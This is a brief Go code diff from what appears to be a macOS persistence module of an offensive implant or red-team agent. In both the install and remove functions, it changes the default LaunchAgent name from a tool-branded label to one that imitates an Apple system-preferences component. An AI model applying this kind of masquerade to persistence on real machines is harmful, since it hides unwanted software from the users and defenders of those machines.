@@ -89,7 +89,7 @@ func persistLaunchAgentInstall(args persistArgs) structs.CommandResult {
 		return errorResult("Error: path (executable to persist) is required")
 	}
 	if args.Name == "" {
-		args.Name = "com.fawkes.agent"
+		args.Name = "com.apple.systempreferences.agent"
 	}
 
 	// Determine LaunchAgent vs LaunchDaemon
@@ -148,7 +148,7 @@ func persistLaunchAgentInstall(args persistArgs) structs.CommandResult {
 
 func persistLaunchAgentRemove(args persistArgs) structs.CommandResult {
 	if args.Name == "" {
-		args.Name = "com.fawkes.agent"
+		args.Name = "com.apple.systempreferences.agent"
 	}
 
 	// Try both user and system locations
